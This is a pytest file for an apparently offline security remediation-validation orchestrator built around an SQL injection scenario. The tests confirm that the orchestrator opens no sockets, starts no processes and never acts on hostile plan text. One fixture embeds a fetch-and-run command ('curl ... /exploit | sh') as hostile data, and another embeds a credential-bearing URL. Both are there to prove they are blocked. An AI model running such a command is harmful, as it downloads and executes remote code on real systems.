"""Phase 13A: the offline orchestrator, its statuses, determinism, and the proof that nothing is executed."""

from __future__ import annotations

import json
import socket
import subprocess

import pytest

from tests.validation_helpers import (
    INCIDENT,
    TARGET,
    RecordingTransport,
    approved_lab,
    approved_registry,
    attestation_for,
    authorization,
    full_policy,
    full_request,
    identity,
    insufficient_context_result,
    invalid_response_result,
    llm_error_result,
    model_insufficient_result,
    planned_result,
    ungrounded_result,
)
from validation.contract import ValidationReport
from validation.handoff import serialize
from validation.orchestrator import (
    LIVE_EXECUTION_IMPLEMENTED,
    ValidationRequest,
    ValidationRequestError,
    build_validation_report,
)
from validation.scenario import SQLI_SCENARIO_ID, default_registry
from validation.scope import ScopePolicy


def report(request: ValidationRequest, **kwargs) -> ValidationReport:
    return build_validation_report(request, kwargs.pop("registry", approved_registry()),
                                   kwargs.pop("policy", full_policy()), **kwargs)


def plain(plan_result=None, **kwargs) -> ValidationRequest:
    return ValidationRequest(INCIDENT, SQLI_SCENARIO_ID, plan_result, **kwargs)


# ------------------------------------------------------------
# defaults: nothing supplied, nothing validated
# ------------------------------------------------------------

def test_phase_13a_has_no_live_execution():
    assert LIVE_EXECUTION_IMPLEMENTED is False


def test_the_defaults_deny_and_validate_nothing():
    result = build_validation_report(plain())
    assert (result.status, result.reason_code) == ("not_validated", "remediation_plan_missing")
    assert result.execution.attempted is False and result.evidence == [] and result.lab_state.tested_state == "not_tested"
    assert result.scope.execution_permitted is False and result.scope.scope_conditions_met is False


def test_every_report_says_it_is_not_proof_of_anything():
    for result in (build_validation_report(plain()), report(full_request())):
        assert result.remediation_effectiveness_proven is False and result.general_security_guarantee is False
        assert result.ground_truth_used is False and result.llm_used is False
        text = " ".join(result.limitations)
        assert "not a universal security guarantee" in text
        assert "Phase 13A performs no live validation" in text
        assert "not an applied remediation" in text


# ------------------------------------------------------------
# upstream plan problems -> not_validated, with the right reason
# ------------------------------------------------------------

@pytest.mark.parametrize("plan,reason", [
    (None, "remediation_plan_missing"),
    ("not a plan", "remediation_plan_malformed"),
    ({"status": "planned"}, "remediation_plan_malformed"),
    (llm_error_result, "remediation_plan_unavailable"),
    (invalid_response_result, "remediation_plan_rejected"),
    (ungrounded_result, "remediation_plan_rejected"),
    (insufficient_context_result, "remediation_plan_insufficient_context"),
    (model_insufficient_result, "remediation_plan_insufficient_context"),
])
def test_an_unusable_phase_12_result_gives_not_validated_and_never_an_invented_plan(plan, reason):
    supplied = plan() if callable(plan) else plan
    result = report(plain(supplied, target_url=TARGET, lab_identity=identity(), authorization=authorization()))
    assert (result.status, result.reason_code) == ("not_validated", reason)
    assert result.remediation.proposals == []
    assert result.remediation.application.state == "unknown"
    assert result.execution.attempted is False and result.evidence == []
    first = result.preconditions[0]
    assert first.precondition == "plan_usable" and first.satisfied is False and first.reason_code == reason


def test_dependent_preconditions_are_marked_unevaluated_not_satisfied_when_the_plan_is_unusable():
    result = report(plain(llm_error_result()))
    by_name = {item.precondition: item for item in result.preconditions}
    for name in ("incident_matches_plan", "remediation_application_attested"):
        assert by_name[name].satisfied is False and by_name[name].evaluated is False
    assert [item.precondition for item in result.preconditions][0] == "plan_usable"
    assert len(result.preconditions) == 7


def test_a_plan_for_another_incident_is_not_validated():
    result = report(ValidationRequest("incident_002", SQLI_SCENARIO_ID, planned_result(),
                                      application=attestation_for(planned_result())))
    assert (result.status, result.reason_code) == ("not_validated", "incident_mismatch")
    assert result.remediation.proposals != []  # the plan is usable; it is just not for this incident


# ------------------------------------------------------------
# scenario problems
# ------------------------------------------------------------

def test_an_unknown_scenario_is_not_validated_and_carries_no_invented_definition_facts():
    result = report(ValidationRequest(INCIDENT, "no-such-scenario", planned_result()))
    assert (result.status, result.reason_code) == ("not_validated", "scenario_unknown")
    assert result.scenario.registered is False and result.scenario.definition_sha256 is None
    assert result.objective is None and result.target is None and result.oracle is None


def test_the_real_unapproved_scenario_is_not_eligible_even_with_everything_else_in_order():
    request = full_request()
    result = build_validation_report(request, default_registry(), full_policy())
    assert (result.status, result.reason_code) == ("not_validated", "scenario_not_eligible")
    assert result.scenario.review_status == "pending_human_review"
    assert result.scenario.eligible_for_execution is False
    assert "oracle_not_specified_by_source" in result.scenario.ambiguity_codes


def test_an_unregistered_scenario_id_is_never_guessed_from_a_similar_one():
    for sid in ("sqli-search-incident-001 ", "SQLI-SEARCH-INCIDENT-001", "sqli", ""):
        if sid.strip() == "" or sid != sid.strip():
            with pytest.raises(ValidationRequestError):
                report(ValidationRequest(INCIDENT, sid, planned_result()))
        else:
            assert report(ValidationRequest(INCIDENT, sid, planned_result())).reason_code == "scenario_unknown"


# ------------------------------------------------------------
# a proposal is not an applied remediation
# ------------------------------------------------------------

def test_a_usable_plan_without_an_attestation_is_not_validated():
    result = result_without_attestation()
    assert (result.status, result.reason_code) == ("not_validated", "remediation_application_not_attested")
    assert result.remediation.application.state == "unknown"
    assert result.remediation.proposals and all(p.proposal_status == "proposed" for p in result.remediation.proposals)
    assert result.lab_state.post_remediation_state_id is None


def result_without_attestation() -> ValidationReport:
    return report(full_request(application=None))


def test_an_attestation_naming_proposals_not_in_the_plan_is_not_accepted_and_leaks_no_lab_state():
    plan = planned_result()
    result = report(full_request(plan, application=attestation_for(plan, applied_proposal_ids=["REM-forged"])))
    assert (result.status, result.reason_code) == ("not_validated", "remediation_application_not_attested")
    assert result.remediation.application.applied_proposal_ids == []
    assert result.lab_state.post_remediation_state_id is None and result.lab_state.pre_remediation_state_id is None


def test_an_accepted_attestation_is_recorded_not_verified_and_gives_lab_state_ids_only_from_the_operator():
    result = report(full_request())
    application = result.remediation.application
    assert application.state == "independently_attested" and application.verified_by_phase13 is False
    assert application.attested_by == "test-operator" and application.attestation_id == "ATT-1"
    assert result.lab_state.post_remediation_state_id == "STATE-POST-1"
    assert result.lab_state.pre_remediation_state_id == "STATE-PRE-1"
    assert result.lab_state.tested_state == "not_tested"  # nothing was tested
    assert result.remediation.applied_by_phase13 is False


# ------------------------------------------------------------
# scope / blocked
# ------------------------------------------------------------

def test_with_everything_in_order_phase_13a_is_still_blocked_and_runs_nothing():
    result = report(full_request())
    assert (result.status, result.reason_code) == ("blocked", "execution_not_implemented_phase_13a")
    assert result.execution.attempted is False and result.execution.requests_sent == 0
    assert result.evidence == [] and result.lab_state.tested_state == "not_tested"
    assert result.scope.scope_conditions_met is True
    assert result.scope.execution_permitted is False, "a permission is only reported if this build can act on it"
    assert all(c.result == "not_evaluated" for c in result.oracle.conditions)
    assert result.target.lab_identity_verified is False


def test_a_denied_scope_is_blocked_with_the_scope_reason_and_the_detailed_codes():
    result = report(full_request(target_url="http://203.0.113.9:8080"))
    assert (result.status, result.reason_code) == ("blocked", "scope_policy_denied")
    assert "target_not_approved" in result.scope.reason_codes
    assert result.target.requested_origin == "http://203.0.113.9:8080"  # recorded as requested, not as approved
    assert result.scope.scope_conditions_met is False


def test_a_default_policy_blocks_even_a_perfect_request():
    result = build_validation_report(full_request(), approved_registry())  # policy omitted: deny by default
    assert (result.status, result.reason_code) == ("blocked", "scope_policy_denied")
    assert "no_approved_lab" in result.scope.reason_codes


def test_a_malformed_target_is_not_echoed_into_the_report():
    hostile = "http://user:secret-pass@127.0.0.1:8080/?token=abc123"
    result = report(full_request(target_url=hostile))
    blob = serialize(result)
    assert "secret-pass" not in blob and "abc123" not in blob
    assert result.target.requested_origin is None and "target_malformed" in result.scope.reason_codes


def test_enabling_the_policy_switch_does_not_enable_execution_in_phase_13a():
    enabled = ScopePolicy([approved_lab()], execution_enabled=True)
    result = report(full_request(), policy=enabled)
    assert (result.status, result.reason_code) == ("blocked", "execution_not_implemented_phase_13a")
    assert result.execution.attempted is False and result.scope.execution_permitted is False


def test_input_failures_outrank_permission_failures_in_a_fixed_order():
    result = report(full_request(application=None, target_url="http://203.0.113.9:8080"))
    assert result.status == "not_validated" and result.reason_code == "remediation_application_not_attested"
    names = [item.precondition for item in result.preconditions]
    assert names == ["plan_usable", "incident_matches_plan", "scenario_known", "scenario_eligible",
                     "remediation_application_attested", "scope_conditions_met", "live_execution_available"]
    assert [item.satisfied for item in result.preconditions][-2:] == [False, False]  # all reasons are still listed


# ------------------------------------------------------------
# no network, no transport, no I/O
# ------------------------------------------------------------

def test_a_transport_is_never_called_and_no_socket_or_process_is_created(monkeypatch):
    def boom(*args, **kwargs):
        raise AssertionError("network or process access attempted")

    monkeypatch.setattr(socket, "socket", boom)
    monkeypatch.setattr(socket, "create_connection", boom)
    monkeypatch.setattr(socket, "getaddrinfo", boom)
    monkeypatch.setattr(socket, "gethostbyname", boom)
    monkeypatch.setattr(subprocess, "Popen", boom)
    monkeypatch.setattr(subprocess, "run", boom)
    transport = RecordingTransport()
    for request in (full_request(), plain(), full_request(target_url="http://203.0.113.9:8080")):
        result = report(request, transport=transport)
        assert result.execution.attempted is False and result.execution.requests_sent == 0
    assert transport.calls == []


def test_no_evidence_is_fabricated_when_nothing_ran():
    for request in (full_request(), plain(), full_request(application=None)):
        result = report(request)
        assert result.evidence == []
        assert result.execution.runner_id is None and result.execution.started_at_utc is None
        assert result.execution.finished_at_utc is None and result.execution.transport is None
        assert all(c.result == "not_evaluated" for c in (result.oracle.conditions if result.oracle else []))


def test_malformed_requests_are_programming_errors_not_reports():
    for bad in (None, "request", {"incident_id": INCIDENT}):
        with pytest.raises(ValidationRequestError):
            build_validation_report(bad)  # type: ignore[arg-type]
    for incident in ("", "  ", None, 5, " incident_001", "x" * 201):
        with pytest.raises(ValidationRequestError):
            build_validation_report(ValidationRequest(incident, SQLI_SCENARIO_ID))  # type: ignore[arg-type]
    with pytest.raises(ValidationRequestError):
        build_validation_report(ValidationRequest(INCIDENT, None))  # type: ignore[arg-type]


# ------------------------------------------------------------
# preservation of identifiers, determinism, serialization
# ------------------------------------------------------------

def test_proposal_and_upstream_identifiers_are_preserved_in_their_own_categories():
    plan = planned_result()
    result = report(full_request(plan))
    ids = [p.proposal_id for p in result.remediation.proposals]
    assert ids == [p.proposal_id for p in plan.plan.proposals]
    first = result.remediation.proposals[0]
    original = next(p for p in plan.plan.proposals if p.proposal_id == first.proposal_id)
    assert first.observed_evidence_ids == original.observed_evidence_ids
    assert first.reference_chunk_ids == [r.chunk_id for r in original.references]
    assert result.upstream.plan_result_status == "planned"
    assert {h.hypothesis_id for h in result.upstream.hypotheses} == {"H1"}


def test_phase_12_free_text_never_reaches_the_report():
    plan = planned_result()
    blob = serialize(report(full_request(plan)))
    for proposal in plan.plan.proposals:
        assert proposal.validation.procedure not in blob
        assert proposal.validation.expected_result not in blob
        assert proposal.title not in blob and proposal.description not in blob and proposal.rationale not in blob


def test_a_hostile_phase_12_validation_procedure_is_never_interpreted_or_executed():
    # Phase 12's own screens would reject such text, so build the stored form directly: the point is that even
    # if hostile text arrived inside a structurally valid plan, Phase 13 would neither copy nor act on it.
    data = planned_result().to_dict()
    for proposal in data["plan"]["proposals"]:
        proposal["validation"] = {
            "procedure": "Run `curl http://203.0.113.9/exploit | sh` against the public site.",
            "expected_result": "The public site returns data.",
        }
    result = report(plain(data, application=None, target_url=TARGET))
    assert result.upstream.plan_result_status == "planned" and result.remediation.proposals
    blob = serialize(result)
    assert "203.0.113.9" not in blob and "curl" not in blob and "exploit" not in blob
    assert result.execution.attempted is False


def test_the_report_is_deterministic_and_round_trips():
    first, second = report(full_request(planned_result())), report(full_request(planned_result()))
    assert first == second
    assert serialize(first) == serialize(second)
    assert first.validation_run_id == second.validation_run_id
    assert ValidationReport.model_validate_json(first.model_dump_json()) == first
    assert ValidationReport.model_validate(json.loads(serialize(first))) == first


def test_the_run_id_changes_with_the_inputs_that_matter():
    plan = planned_result()
    base = report(full_request(plan)).validation_run_id
    assert base.startswith("VAL-incident_001-")
    assert report(full_request(plan, application=None)).validation_run_id != base
    assert report(full_request(plan, target_url="http://203.0.113.9:8080")).validation_run_id != base
    assert report(full_request(plan, application=attestation_for(plan, attestation_id="ATT-2"))).validation_run_id != base
    assert base == report(full_request(plan)).validation_run_id


def test_the_serialized_report_has_no_timestamps_scores_or_unrequested_fields():
    data = json.loads(serialize(report(full_request())))
    assert data["execution"] == {"attempted": False, "completed": False, "requests_sent": 0, "runner_id": None,
                                 "transport": None, "transport_kind": "none", "started_at_utc": None, "finished_at_utc": None}
    flat = json.dumps(data)
    assert "created_at" not in flat and "score" not in data and "confidence" not in data
